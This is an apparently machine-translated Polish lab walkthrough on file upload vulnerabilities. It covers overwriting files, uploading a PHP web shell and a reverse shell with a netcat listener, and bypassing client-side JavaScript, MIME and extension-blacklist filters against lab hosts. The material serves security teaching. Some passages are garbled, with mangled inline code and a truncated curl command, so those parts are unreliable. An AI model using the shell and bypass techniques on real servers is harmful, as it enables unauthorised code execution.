---

Instrukcje w tym zadaniu pomogą Ci skonfigurować [plik hosts(otwiera się w nowej karcie)](https://www.ionos.co.uk/digitalguide/server/configuration/hosts-file/) Twojego urządzenia. Plik hosts służy do mapowania nazw domen lokalnych, z pominięciem DNS Krótko mówiąc, pozwala lokalnie mapować adresy IP na nazwy domen, bez konieczności korzystania z serwera DNS do rozwiązywania adresu IP. Jest to przydatne w środowiskach takich jak TryHackMe, gdzie DNS nie jest dostępny, ponieważ pozwala nam ręcznie mapować jedną lub więcej domen/subdomen na wybrany adres IP. Możliwość dostępu do treści za pomocą domeny umożliwia (między innymi) korzystanie z wirtualnego hostingu opartego na nazwach – często nazywanego „vhostingiem” – do obsługi wielu stron internetowych z jednego serwera WWW: funkcja ta jest szeroko wykorzystywana w tym miejscu.  

Bardzo ważne jest, aby zrozumieć te koncepcje przed kontynuowaniem. Jeśli którakolwiek z powyższych informacji wydaje Ci się niezrozumiała, zapoznaj się z informacjami (np. [tutaj](https://tryhackme.com/room/introtonetworking) ) dotyczącymi działania nazw domen, adresów IP i wirtualnych hostów serwerów WWW, zanim przejdziesz dalej z treścią tego pokoju.

---

Najpierw wdrożymy maszynę i odczekamy kilka minut na jej uruchomienie.

Po kliknięciu przycisku „Wdróż” musisz skonfigurować swój komputer, aby móc się połączyć.  

Jeśli udało Ci się pomyślnie wdrożyć maszynę, poniższe bloki kodu będą już zawierały wypełniony adres IP. Jeśli którykolwiek z nich zawiera fragment „MACHINE_IP”, nadal musisz wdrożyć maszynę, a poniższe instrukcje nie będą działać .

---

Używając ulubionego edytora tekstu _w sesji administracyjnej_ , otwórz plik hosts na swoim urządzeniu.

- Na Linuxa w systemie MacOS plik hosts można znaleźć pod adresem `/etc/hosts`.
- W systemie Windows plik hosts można znaleźć w katalogu `C:\Windows\System32\drivers\etc\hosts`.

W systemie Linux lub MacOS należy użyć `sudo`przycisku „Otwórz plik do zapisu”. W systemie Windows należy otworzyć plik za pomocą opcji „Uruchom jako administrator”.

Dodaj następujący wiersz na końcu pliku:

`MACHINE_IP    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm`

_**Uwaga:** Jeśli wykonałeś/aś ten krok wcześniej, musisz usunąć poprzedni wpis. W pliku powinien znajdować się tylko jeden wiersz zawierający powyższe adresy URL. Na przykład poniższy przykład nie zadziała :_

`10.10.10.10    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm   MACHINE_IP    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm   `

Kiedy zakończysz działanie swojej instancji maszyny z laboratorium przesyłania luk w zabezpieczeniach, pamiętaj o usunięciu tego wiersza!

Nie trzeba dodawać, że **nie** otrzymasz tego samego adresu IP, jeśli później ponownie wdrożysz komputer laboratoryjny. Oznacza to, że wszelkie istniejące wpisy w pliku hosts po ponownym wdrożeniu będą wskazywać na niewłaściwy adres (czyli błąd łączności). Jeśli dodasz duplikat wiersza bez usunięcia oryginalnego, jak wspomniano powyżej, _również_ pojawi się błąd łączności. Usunięcie go zaraz po wyłączeniu komputera przywraca go do stanu pierwotnego i eliminuje możliwość wystąpienia błędu.  

---

Teraz powinieneś mieć dostęp do urządzenia laboratoryjnego, więc zaczynajmy!

_**Uwaga:** Jeśli okaże się, że nie możesz uzyskać dostępu do witryn, prawie zawsze jest to spowodowane jedną z następujących przyczyn:  
A) Zduplikowanymi wpisami w pliku hosta  
B) Posiadaniem pliku anonimizującegoVPNaktywny wraz z pakietem połączeń VPN TryHackMe_

Możliwość przesyłania plików na serwer stała się integralną częścią interakcji z aplikacjami internetowymi. Niezależnie od tego, czy chodzi o zdjęcie profilowe w serwisie społecznościowym, raport przesyłany do chmury, czy zapisanie projektu na Githubie – możliwości przesyłania plików są nieograniczone.

Niestety, nieumiejętne przesyłanie plików może również otworzyć poważne luki w zabezpieczeniach serwera. Może to prowadzić do wszystkiego, od stosunkowo drobnych, uciążliwych problemów, aż po całkowite zdalne wykonanie kodu (RCE) jeśli atakującemu uda się przesłać i uruchomić powłokę. Mając nieograniczony dostęp do przesyłania danych na serwer (i możliwość pobierania danych w dowolnym momencie), atakujący może zniszczyć lub w inny sposób zmodyfikować istniejącą zawartość – włącznie z wstrzykiwaniem złośliwych stron internetowych, co prowadzi do dalszych luk w zabezpieczeniach, takich jak XSS lub CSRF Przesyłając dowolne pliki, atakujący może potencjalnie wykorzystać serwer do hostowania i/lub udostępniania nielegalnych treści lub do wycieku poufnych informacji. Realistycznie rzecz biorąc, atakujący, który ma możliwość przesłania dowolnego pliku na Twój serwer – bez żadnych ograniczeń – jest naprawdę bardzo niebezpieczny.  

Celem tej sali jest zbadanie niektórych luk w zabezpieczeniach wynikających z nieprawidłowego (lub nieodpowiedniego) przesyłania plików. W szczególności przyjrzymy się:

- Nadpisywanie istniejących plików na serwerze
- Przesyłanie i wykonywanie powłok na serwerze  
- Omijanie filtrowania po stronie klienta
- Omijanie różnych rodzajów filtrowania po stronie serwera
- Oszukiwanie podczas sprawdzania poprawności typu zawartości

Ukończenie [wyliczania sieci](https://tryhackme.com/room/webenumerationv2) (lub przynajmniej Gobuster(sekcja) i pokoje [„Co to jest Shell”](https://tryhackme.com/room/introtoshells) będą dobrym pomysłem przed przystąpieniem do przeglądania zawartości tego pokoju.  

Zaczynajmy!

Mamy więc punkt przesyłania plików na stronie. Jak możemy go wykorzystać?

Jak w przypadku każdego rodzaju hakowania, enumeracja jest kluczowa. Im lepiej rozumiemy nasze środowisko, tym więcej możemy z nim _zrobić_ . Warto przyjrzeć się kodowi źródłowemu strony, aby sprawdzić, czy zastosowano jakieś filtrowanie po stronie klienta. Skanowanie za pomocą bruteforcera katalogów, takiego jak Gobuster jest zazwyczaj pomocny w atakach internetowych i może ujawnić, gdzie przesyłane są pliki; Gobuster nie jest już domyślnie instalowany w systemie Kali, ale można go zainstalować za pomocą `sudo apt install gobuster`. Przechwytywanie żądań przesyłania za pomocą [Burpsuite](https://tryhackme.com/room/burpsuitebasics) również będzie przydatne. Rozszerzenia przeglądarek, takie jak [Wappalyser(otwiera się w nowej karcie)](https://www.wappalyzer.com/download)może na pierwszy rzut oka dostarczyć cennych informacji na temat witryny, którą chcesz odwiedzić.  

Mając podstawową wiedzę na temat sposobu, w jaki strona internetowa przetwarza nasze dane wejściowe, możemy spróbować sprawdzić, co możemy, a czego nie możemy przesłać. Jeśli strona korzysta z filtrowania po stronie klienta, możemy łatwo zajrzeć do kodu filtra i spróbować go ominąć (więcej na ten temat później!). Jeśli strona korzysta z filtrowania po stronie serwera, możemy musieć zgadnąć, czego szuka filtr, przesłać plik, a następnie spróbować czegoś innego na podstawie komunikatu o błędzie, jeśli przesyłanie się nie powiedzie. Przesyłanie plików zaprojektowanych tak, aby powodować błędy, może w tym pomóc. Narzędzia takie jak Burpsuite lub OWASP Zastrzelić może być bardzo pomocne na tym etapie.

W dalszej części zadania przedstawimy bardziej szczegółowo omijanie filtrów.

Po przesłaniu plików na serwer należy przeprowadzić szereg kontroli, aby upewnić się, że plik nie nadpisze niczego, co już istnieje na serwerze. Powszechną praktyką jest nadawanie plikowi nowej nazwy – często losowej lub z datą i godziną przesłania dodaną na początku lub końcu oryginalnej nazwy pliku. Alternatywnie można sprawdzić, czy nazwa pliku już istnieje na serwerze; jeśli plik o tej samej nazwie już istnieje, serwer zwróci komunikat o błędzie z prośbą o wybranie innej nazwy. Uprawnienia do plików odgrywają również rolę w ochronie istniejących plików przed nadpisaniem. Na przykład strony internetowe nie powinny być dostępne do zapisu dla użytkownika, co zapobiega nadpisaniu ich złośliwą wersją przesłaną przez atakującego.

Jeśli jednak nie podejmiemy takich środków ostrożności, potencjalnie możemy nadpisać istniejące pliki na serwerze. Realistycznie rzecz biorąc, uprawnienia do plików na serwerze prawdopodobnie zapobiegną wystąpieniu poważnej luki w zabezpieczeniach. Mimo to, może to być dość uciążliwe i warto na to zwrócić uwagę w środowisku pentestów lub wykrywania błędów.

Zanim spróbujesz zrobić to sam, przeanalizujmy to na przykładzie.

### ❗❗Ostrzeżenie ❗❗

_Należy pamiętać, że ta strona_ `demo.uploadvulns.thm`_będzie używana we wszystkich demonstracjach; jednak **ta strona nie jest dostępna w przesłanej maszynie wirtualnej** . Służy ona wyłącznie celom demonstracyjnym._

_Próby uzyskania dostępu do tej subdomeny będą miały zabawne konsekwencje... zostałeś ostrzeżony.  
_

Na poniższym obrazku widzimy stronę internetową z formularzem przesyłania:

![](https://cdn-images.tryhackme.com/user-uploads/5e86dbbd98fde62929a7e03b/room-content/5e86dbbd98fde62929a7e03b-1759494686706.png)

Być może będziesz musiał podać więcej szczegółów, aby było to prawdziwe wyzwanie; w tym przypadku jednak spójrzmy tylko na kod źródłowy strony:

![](https://cdn-images.tryhackme.com/user-uploads/5e86dbbd98fde62929a7e03b/room-content/5e86dbbd98fde62929a7e03b-1759494769552.png)

W czerwonym polu widzimy kod odpowiedzialny za wyświetlanie obrazu, który widzieliśmy na stronie. Pochodzi on z pliku o nazwie „spaniel.jpg”, znajdującego się w katalogu o nazwie „images”.

Teraz wiemy, skąd pobierany jest obraz — czy możemy go nadpisać?

Pobierzmy kolejny obraz z internetu i nazwijmy go `spaniel.jpg`. Następnie prześlemy go na stronę i sprawdzimy, czy możemy nadpisać istniejący obraz:

![](https://cdn-images.tryhackme.com/user-uploads/5e86dbbd98fde62929a7e03b/room-content/5e86dbbd98fde62929a7e03b-1759495388389.png)

![](https://cdn-images.tryhackme.com/user-uploads/5e86dbbd98fde62929a7e03b/room-content/5e86dbbd98fde62929a7e03b-1759495947155.png)

I nasz atak się powiódł! Udało nam się nadpisać oryginał `images/spaniel.jpg`naszą własną kopią.

---

Teraz wcielimy to w życie.

Otwórz przeglądarkę internetową i przejdź do `overwrite.uploadvulns.thm`. Twoim celem jest nadpisanie pliku na serwerze własnym przesłaniem.

Nadpisywanie plików na serwerze jest w porządku. To uciążliwe dla osoby zarządzającej witryną i może prowadzić do pewnych luk w zabezpieczeniach, ale pójdźmy dalej.RCE!

Zdalne wykonywanie kodu (jak sama nazwa wskazuje) pozwala nam na dowolne wykonywanie kodu na serwerze WWW. Chociaż najprawdopodobniej odbywa się to za pośrednictwem konta użytkownika o niskich uprawnieniach (np. www-datana serwerach Linux), nadal jest to niezwykle poważna luka w zabezpieczeniach. Zdalne wykonywanie kodu za pośrednictwem luki w zabezpieczeniach związanej z przesyłaniem danych w aplikacji WWW jest zazwyczaj wykorzystywane poprzez przesłanie programu napisanego w tym samym języku, co zaplecze witryny (lub w innym języku, który serwer rozumie i wykona). Tradycyjnie byłby to PHP, jednak w ostatnich czasach inne języki programowania zaplecza stały się bardziej powszechne (Python, Django i Javascript w postaci Node.js są głównymi przykładami). Warto zauważyć, że w aplikacji routowanej (tj. takiej, w której trasy są definiowane programowo, a nie mapowane na system plików), ta metoda ataku staje się znacznie bardziej skomplikowana i znacznie mniej prawdopodobna. Większość współczesnych frameworków WWW jest routowana programowo.

Istnieją dwa podstawowe sposoby uzyskania RCE na serwerze WWW podczas wykorzystywania luki w zabezpieczeniach związanej z przesyłaniem plików: powłoki webowe i powłoki odwrotne/bind. Realistycznie rzecz biorąc, w pełni funkcjonalna powłoka odwrotna/bind jest idealnym celem dla atakującego; jednak powłoka webowa może być jedyną dostępną opcją (na przykład, jeśli na przesyłanie plików nałożono limit długości lub jeśli reguły zapory sieciowej uniemożliwiają korzystanie z powłok sieciowych). Przyjrzymy się każdemu z nich po kolei. Ogólnie rzecz biorąc, chcielibyśmy przesłać powłokę dowolnego rodzaju, a następnie ją aktywować, albo przechodząc bezpośrednio do pliku, jeśli serwer na to pozwala (aplikacje nieroutowane z niewystarczającymi ograniczeniami), albo w inny sposób wymuszając na aplikacji webowej uruchomienie skryptu (co jest konieczne w przypadku aplikacji routowanych).

Powłoki internetowe:

Załóżmy, że znaleźliśmy stronę internetową z formularzem przesyłania danych:

Co dalej? No cóż, zacznijmy od skanu Gobustera:

Wygląda na to, że mamy tu dwa katalogi – uploadsi assets. Z nich prawdopodobnie wszystkie przesłane przez nas pliki trafią do katalogu „uploads”. Najpierw spróbujemy przesłać legalny plik graficzny. Wybieram tutaj nasze urocze zdjęcie psa z poprzedniego zadania:

Jeśli teraz przejdziemy do , http://demo.uploadvulns.thm/uploadspowinniśmy zobaczyć, że zdjęcie spaniela zostało przesłane!

OK, możemy przesyłać obrazy. Spróbujmy teraz użyć powłoki webowej.

W tej chwili wiemy, że ten serwer WWW działa z zapleczem PHP, więc przejdziemy od razu do tworzenia i przesyłania powłoki. W rzeczywistości może być konieczne wykonanie nieco większej liczby enumeracji, ale PHP to dobry punkt wyjścia.

Prosty webshell działa poprzez pobranie parametru i wykonanie go jako polecenia systemowego. W PHP składnia tego wyglądałaby następująco:

<?php
    echo system($_GET["cmd"]);
?>   

Ten kod przyjmuje parametr GET i wykonuje go jako polecenie systemowe. Następnie wyświetla dane wyjściowe na ekranie.

Spróbujmy przesłać go na stronę, a następnie użyć go do wyświetlenia bieżącego użytkownika i zawartości bieżącego katalogu:

Sukces!

Teraz moglibyśmy użyć tej powłoki do odczytu plików z systemu lub przejść z niej do powłoki odwrotnej. Teraz, gdy mamy RCE, możliwości są nieograniczone. Należy pamiętać, że podczas korzystania z powłok webowych zazwyczaj łatwiej jest przeglądać dane wyjściowe, patrząc na kod źródłowy strony. To znacznie poprawia formatowanie danych wyjściowych.

Muszle odwrócone:

Proces przesyłania powłoki odwrotnej jest niemal identyczny jak w przypadku przesyłania powłoki webowej, dlatego ta sekcja będzie krótsza. Będziemy korzystać z wszechobecnej powłoki odwrotnej Pentest Monkey, która jest domyślnie dostępna w systemie Kali Linux, ale można ją również pobrać tutaj.(otwiera się w nowej karcie)Musisz edytować wiersz 49 powłoki. Obecnie wyświetla się  komunikat: „Zmień adres IP TryHackMe tun0”, który można znaleźć na stronie dostępu . Możesz zignorować poniższy wiersz, który również wymaga zmiany. Po edycji powłoki, kolejnym krokiem jest uruchomienie nasłuchiwacza Netcat w celu odebrania połączenia .$ip = '127.0.0.1';  // CHANGE THIS
127.0.0.1nc -lvnp 1234

Teraz prześlijmy powłokę, a następnie aktywujmy ją, przechodząc do http://demo.uploadvulns.thm/uploads/shell.php. Nazwa powłoki będzie oczywiście taka, jaką jej nadałeś ( php-reverse-shell.phpdomyślnie).

Strona internetowa powinna się zawiesić i nie załadować poprawnie — jeśli jednak przełączymy się z powrotem na terminal, pojawi się błąd!

Ponownie uzyskaliśmy RCE na tym serwerze WWW. Teraz chcielibyśmy ustabilizować naszą powłokę i zwiększyć uprawnienia, ale to zadania na inny czas. A teraz czas, żebyś sam to sprawdził!

Przejdź do shell.uploadvulns.thmpytań dotyczących tego zadania i odpowiedz na nie.

Odpowiedz na poniższe pytania
Przeprowadź skanowanie witryny za pomocą Gobustera, używając składni z powyższego zrzutu ekranu. Jaki katalog może być używany do przesyłania plików?

(Uwaga: to dobry nawyk, który przyda Ci się w nadchodzących zadaniach...)

Do tej pory w dużej mierze ignorowaliśmy mechanizmy obronne stosowane przez twórców stron internetowych w celu obrony przed lukami w zabezpieczeniach związanymi z przesyłaniem plików. Każda strona internetowa, którą udało Ci się do tej pory skutecznie zaatakować w tym miejscu, była całkowicie niezabezpieczona. Czas to zmienić. Od teraz przyjrzymy się mechanizmom obronnym stosowanym w celu zapobiegania złośliwemu przesyłaniu plików i sposobom ich obejścia.

Najpierw omówmy różnice między filtrowaniem po stronie klienta i filtrowaniem po stronie serwera .

Kiedy mówimy o skrypcie „po stronie klienta”, w kontekście aplikacji internetowych, mamy na myśli to, że jest on uruchamiany w przeglądarce użytkownika, a nie na samym serwerze internetowym. JavaScript jest praktycznie wszechobecny jako język skryptowy po stronie klienta, choć istnieją alternatywy. Niezależnie od używanego języka, skrypt po stronie klienta zostanie uruchomiony w przeglądarce internetowej. W kontekście przesyłania plików oznacza to, że filtrowanie następuje jeszcze przed przesłaniem pliku na serwer. Teoretycznie wydawałoby się to dobrym rozwiązaniem, prawda? W idealnym świecie tak by było; jednak ponieważ filtrowanie odbywa się na naszym komputerze, jest ono banalnie proste do obejścia. Z tego powodu filtrowanie po stronie klienta samo w sobie jest wysoce niebezpieczną metodą weryfikacji, czy przesłany plik nie jest złośliwy.

I odwrotnie, jak zapewne się domyśliłeś, skrypt po stronie serwera zostanie uruchomiony na serwerze. TradycyjniePHPbył dominującym językiem po stronie serwera (z ASP firmy Microsoft dlaIIS(zajmując drugie miejsce); jednak w ostatnich latach inne opcje (C#, Node.js, Python, Ruby on Rails i wiele innych) stały się szerzej stosowane. Filtrowanie po stronie serwera jest zazwyczaj trudniejsze do obejścia, ponieważ nie ma się przed sobą kodu. Ponieważ kod jest wykonywany na serwerze, w większości przypadków całkowite obejście filtra będzie również niemożliwe; zamiast tego musimy utworzyć ładunek, który jest zgodny z zastosowanymi filtrami, ale nadal pozwala nam na wykonanie kodu.

Mając to na uwadze, przyjrzyjmy się różnym rodzajom filtrowania.

Walidacja rozszerzenia:

Rozszerzenia plików służą (teoretycznie) do identyfikacji zawartości pliku. W praktyce są bardzo łatwe do zmiany, więc tak naprawdę niewiele znaczą; jednak system operacyjny MS Windows nadal używa ich do identyfikacji typów plików, chociaż systemy oparte na Uniksie zazwyczaj korzystają z innych metod, które omówimy za chwilę. Filtry sprawdzające rozszerzenia działają na jeden z dwóch sposobów. Albo umieszczają rozszerzenia na czarnej liście (tj. mają listę rozszerzeń, które są niedozwolone ), albo umieszczają rozszerzenia na białej liście (tj. mają listę rozszerzeń dozwolonych i odrzucają wszystkie inne).

Filtrowanie typów plików:

Podobnie jak w przypadku walidacji rozszerzeń, ale bardziej rygorystycznie, filtrowanie typów plików ponownie weryfikuje, czy zawartość pliku nadaje się do przesłania. Przyjrzymy się dwóm typom walidacji typów plików:

MIMWalidacja: Typy MIME ( Multipurpose Internet Mail Extension ) są używane jako identyfikator plików – pierwotnie w przypadku przesyłania ich jako załączników w wiadomościach e - mail, ale obecnie również w przypadku przesyłania plików przezHTTP(S). Typ MIME dla przesłania pliku jest dołączony w nagłówku żądania i wygląda mniej więcej tak:

Typy MIME są zgodne z formatem <typ>/<podtyp>. W powyższym żądaniu widać, że obraz „spaniel.jpg” został przesłany na serwer. Jako że był to legalny obraz JPEG, typ MIME dla tego przesłania to „image/jpeg”. Typ MIME pliku można sprawdzić po stronie klienta i/lub serwera; jednak ponieważ MIME opiera się na rozszerzeniu pliku, jest to niezwykle łatwe do obejścia.

Walidacja za pomocą liczb magicznych : Liczby magiczne to dokładniejszy sposób określania zawartości pliku; choć ich sfałszowanie nie jest niemożliwe. „Liczba magiczna” pliku to ciąg bajtów na samym początku zawartości pliku, który identyfikuje tę zawartość. Na przykład plik PNG miałby na samej górze następujące bajty: 89 50 4E 47 0D 0A 1A 0A.

W przeciwieństwie do systemu Windows, systemy Unix używają liczb magicznych do identyfikacji plików; jednak podczas przesyłania plików możliwe jest sprawdzenie liczby magicznej przesyłanego pliku, aby upewnić się, że jest on bezpieczny do zaakceptowania. Nie jest to w żadnym wypadku rozwiązanie gwarantowane, ale jest skuteczniejsze niż sprawdzanie rozszerzenia pliku.
Filtrowanie według długości pliku:

Filtry długości plików służą do zapobiegania przesyłaniu dużych plików na serwer za pośrednictwem formularza przesyłania (ponieważ może to potencjalnie ograniczyć zasoby serwera). W większości przypadków nie będzie to stanowić problemu podczas przesyłania przez powłoki; warto jednak pamiętać, że jeśli formularz przesyłania wymaga przesłania tylko bardzo małego pliku, może istnieć filtr długości, który zapewni spełnienie wymogu dotyczącego długości pliku. Na przykład, nasza w pełni rozwinięta powłoka odwrotna PHP z poprzedniego zadania ma rozmiar 5,4 KB – jest stosunkowo mała, ale jeśli formularz oczekuje maksymalnie 2 KB, musielibyśmy znaleźć alternatywną powłokę do przesłania.

Filtrowanie nazw plików:

Jak wspomniano wcześniej, pliki przesyłane na serwer powinny być unikatowe. Zazwyczaj oznaczałoby to dodanie losowego elementu do nazwy pliku, jednak alternatywną strategią byłoby sprawdzenie, czy plik o tej samej nazwie istnieje już na serwerze i wyświetlenie użytkownikowi komunikatu o błędzie, jeśli tak. Dodatkowo, nazwy plików powinny być oczyszczane podczas przesyłania, aby upewnić się, że nie zawierają żadnych „błędnych znaków”, które mogłyby potencjalnie powodować problemy w systemie plików podczas przesyłania (np. bajtów zerowych lub ukośników w systemie Linux, a także znaków sterujących, takich jak ;i potencjalnie znaków Unicode). Dla nas oznacza to, że w dobrze administrowanym systemie nasze przesyłane pliki prawdopodobnie nie będą miały tej samej nazwy, którą nadaliśmy im przed przesłaniem, więc pamiętaj, że możesz być zmuszony poszukać swojej powłoki, jeśli uda Ci się ominąć filtrowanie treści.

Filtrowanie zawartości plików:

Bardziej skomplikowane systemy filtrowania mogą skanować całą zawartość przesyłanego pliku, aby upewnić się, że nie podszywa się on pod jego rozszerzenie, typ MIME ani numer Magic Number. Jest to znacznie bardziej złożony proces niż ten stosowany w większości podstawowych systemów filtrowania, dlatego nie będziemy go omawiać w tym artykule.

Warto zauważyć, że żaden z tych filtrów nie jest idealny sam w sobie – zazwyczaj są one używane w połączeniu ze sobą, tworząc wielowarstwowy filtr, który znacząco zwiększa bezpieczeństwo przesyłania. Każdy z tych filtrów można zastosować po stronie klienta, serwera lub obu.

Podobnie, różne frameworki i języki posiadają własne, wbudowane metody filtrowania i walidacji przesyłanych plików. W rezultacie możliwe jest pojawienie się exploitów specyficznych dla danego języka; na przykład, do piątej wersji PHP Major możliwe było ominięcie filtra rozszerzeń poprzez dodanie do złośliwego .phppliku bajtu zerowego, a następnie prawidłowego rozszerzenia. Od niedawna możliwe jest również wstrzyknięcie kodu PHP do…exifdane z prawidłowego pliku obrazu, a następnie wymuś jego wykonanie na serwerze. Zachęcamy do dalszych badań, jeśli jesteś zainteresowany.

Zacznijmy od pierwszej (i najsłabszej) linii obrony: filtrowania po stronie klienta.

Jak wspomniano wcześniej, filtrowanie po stronie klienta jest zazwyczaj niezwykle łatwe do obejścia, ponieważ odbywa się w całości na kontrolowanej przez Ciebie maszynie . Mając dostęp do kodu, można go bardzo łatwo zmodyfikować.

Istnieją cztery proste sposoby na ominięcie typowego filtra przesyłania plików po stronie klienta:

Wyłącz JavaScript w przeglądarce – zadziała to pod warunkiem, że strona nie wymaga JavaScriptu do zapewnienia podstawowych funkcji. Jeśli całkowite wyłączenie JavaScriptu uniemożliwi działanie strony, bardziej wskazane byłoby skorzystanie z jednej z pozostałych metod; w przeciwnym razie może to być skuteczny sposób na całkowite ominięcie filtra po stronie klienta.
Przechwytywanie i modyfikowanie strony przychodzącej. Za pomocą Burpsuite możemy przechwycić stronę przychodzącą i usunąć filtr JavaScript, zanim zdąży się uruchomić. Proces ten zostanie opisany poniżej.
Przechwytywanie i modyfikowanie przesyłania pliku . Podczas gdy poprzednia metoda działała przed załadowaniem strony internetowej, ta pozwala stronie internetowej załadować się normalnie, ale przechwytuje przesyłanie pliku po jego przejściu (i zaakceptowaniu przez filtr). Ponownie omówimy proces korzystania z tej metody w trakcie zadania.
Wyślij plik bezpośrednio do punktu przesyłania.curl Po co korzystać ze strony internetowej z filtrem, skoro można wysłać plik bezpośrednio za pomocą narzędzia takiego jak [ curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>brakuje kontekstu - kontekst wymaga ...
Poniżej omówimy szczegółowo metodę drugą i trzecią.

Załóżmy, że ponownie znaleźliśmy stronę do przesyłania plików na stronie internetowej:

Jak zawsze, przyjrzymy się kodowi źródłowemu. Oto podstawowa funkcja JavaScript sprawdzająca typ MIME przesyłanych plików:

W tym przypadku możemy zobaczyć, że filtr używa białej listy , aby wykluczyć każdy typ MIME, który nie jest image/jpeg.

Następnym krokiem jest próba przesłania pliku – zgodnie z oczekiwaniami, jeśli wybierzemy plik JPEG, funkcja go zaakceptuje. W przeciwnym razie przesłanie zostanie odrzucone.

Po ustaleniu tego, uruchommy Burpsuite i przeładujmy stronę. Zobaczymy nasze własne żądanie do witryny, ale tak naprawdę zależy nam na odpowiedzi serwera , więc kliknij prawym przyciskiem myszy przechwycone dane, przewiń w dół do opcji „Do Intercept” (Wykonaj przechwytywanie), a następnie wybierz opcję „Response to this request” (Odpowiedź na to żądanie):

Po kliknięciu przycisku „Przekaż dalej” u góry okna zobaczymy odpowiedź serwera na nasze żądanie. Możemy tutaj usunąć, zakomentować lub w inny sposób przerwać działanie funkcji JavaScript, zanim zdąży się załadować:

Po usunięciu tej funkcji klikamy ponownie „Dalej”, aż do momentu, gdy strona zostanie załadowana całkowicie, a następnie możemy przesłać na stronę dowolny plik:

Warto zauważyć, że Burpsuite domyślnie nie przechwytuje żadnych zewnętrznych plików JavaScript ładowanych przez stronę internetową. Jeśli chcesz edytować skrypt, który nie znajduje się na ładowanej stronie głównej, przejdź do zakładki „Opcje” u góry okna Burpsuite, a następnie w sekcji „Przechwytywanie żądań klienta” edytuj warunek pierwszego wiersza, aby go usunąć ^js$|:

Już ominęliśmy ten filtr, przechwytując go i usuwając przed załadowaniem strony, ale spróbujmy to zrobić, przesyłając plik z prawidłowym rozszerzeniem i typem MIME, a następnie przechwytując i poprawiając przesyłanie za pomocą Burpsuite.

Po ponownym załadowaniu strony internetowej i ponownym zainstalowaniu filtra, użyjmy powłoki odwróconej, której używaliśmy wcześniej, i zmieńmy jej nazwę na „shell.jpg”. Ponieważ typ MIME (na podstawie rozszerzenia pliku) jest automatycznie sprawdzany, filtr po stronie klienta przepuszcza nasz ładunek bez żadnych problemów:

Ponownie aktywujemy nasz przechwyt Burpsuite, klikamy „Prześlij” i przechwytujemy żądanie:

Zauważ, że typ MIME naszej powłoki PHP to obecnie image/jpeg. Zmienimy go na text/x-php, a rozszerzenie pliku z .jpg, .phpa następnie przekażemy żądanie do serwera:

Teraz, gdy przejdziemy do http://demo.uploadvulns.thm/uploads/shell.phpkonfiguracji programu nasłuchującego netcat, otrzymamy połączenie z powłoki!

Szczegółowo omówiliśmy dwa sposoby ominięcia filtra przesyłania plików po stronie klienta. Czas, abyś sam spróbował! Przejdź do sekcji „ java.uploadvulns.thmOmiń filtr”, aby uzyskać powłokę odwrotną. Pamiętaj, że nie wszystkie skrypty po stronie klienta są wbudowane! Jak wspomniano wcześniej,Gobusterbyłoby bardzo dobrym miejscem na początek — nazwa katalogu do przesyłania będzie się zmieniać przy każdym nowym wyzwaniu.

Czas podkręcić tempo!

Filtry po stronie klienta są łatwe do obejścia – można zobaczyć ich kod, nawet jeśli został zaciemniony i wymaga przetworzenia przed odczytaniem; ale co się dzieje, gdy nie można zobaczyć ani zmodyfikować kodu? Cóż, to filtr po stronie serwera. Krótko mówiąc, musimy przeprowadzić wiele testów, aby dowiedzieć się, co jest, a co nie jest dozwolone przez filtr, a następnie stopniowo tworzyć ładunek zgodny z ograniczeniami.

W pierwszej części tego zadania przyjrzymy się witrynie, która używa czarnej listy rozszerzeń plików jako filtra po stronie serwera. Istnieje wiele różnych sposobów kodowania, a sposób, w jaki to obejście zastosujemy, zależy od nich. W rzeczywistości nie moglibyśmy zobaczyć kodu, ale w tym przykładzie zostanie on tutaj uwzględniony:

<?php
    //Get the extension
    $extension = pathinfo($_FILES["fileToUpload"]["name"])["extension"];
    //Check the extension against the blacklist -- .php and .phtml
    switch($extension){
        case "php":
        case "phtml":
        case NULL:
            $uploadFail = True;
            break;
        default:
            $uploadFail = False;
    }
?>

W tym przypadku kod szuka ostatniej kropki ( .) w nazwie pliku i używa jej do potwierdzenia rozszerzenia, więc to właśnie spróbujemy tutaj ominąć. Inne sposoby działania kodu to: wyszukiwanie pierwszej kropki w nazwie pliku lub dzielenie nazwy pliku po każdej kropce i sprawdzanie, czy pojawiają się jakieś rozszerzenia z czarnej listy. Omówimy ten drugi przypadek później, ale tymczasem skupmy się na kodzie, który mamy tutaj.

Widzimy, że kod filtruje rozszerzenia .phpi .phtml, więc jeśli chcemy przesłać skrypt PHP, będziemy musieli znaleźć inne rozszerzenie. Strona Wikipedii(otwiera się w nowej karcie)for PHP oferuje nam kilka popularnych rozszerzeń, które możemy wypróbować; istnieje jednak wiele innych, rzadziej używanych rozszerzeń, które serwery WWW mogą nadal rozpoznawać. Należą do nich: .php3, .php4, .php5, .php7, .phps, .php-si .pht. .pharWiele z nich omija filtr (który blokuje tylko .php) .phtml, ale wygląda na to, że serwer jest skonfigurowany tak, aby nie rozpoznawać ich jako plików PHP, jak w poniższym przykładzie:

W chwili pisania tego tekstu jest to domyślna konfiguracja dla serwerów Apache2. Jednak administrator systemu mógł zmienić domyślną konfigurację (lub serwer mógł być nieaktualny), więc warto spróbować.

Ostatecznie odkrywamy, że .pharrozszerzenie omija filtr i działa, dzięki czemu otrzymujemy naszą powłokę:

Przyjrzyjmy się innemu przykładowi, z innym filtrem. Tym razem zrobimy to całkowicie metodą „czarnej skrzynki”, czyli bez kodu źródłowego.

Ponownie mamy nasz formularz przesyłania:

Dobrze, zacznijmy od sprawdzenia, czy przesyłanie jest całkowicie legalne. Spróbujmy przesłać obraz spaniel.jpgz poprzedniego wpisu:

Cóż, to oznacza, że ​​pliki JPEG są przynajmniej akceptowane. Wybierzmy taki, co do którego możemy być pewni, że zostanie odrzucony ( shell.php):

Nie mogę powiedzieć, że było to nieoczekiwane.

Stąd przechodzimy do dalszych wyliczeń, wypróbowując techniki opisane powyżej i próbując ogólnie zorientować się, co filtr zaakceptuje lub odrzuci.

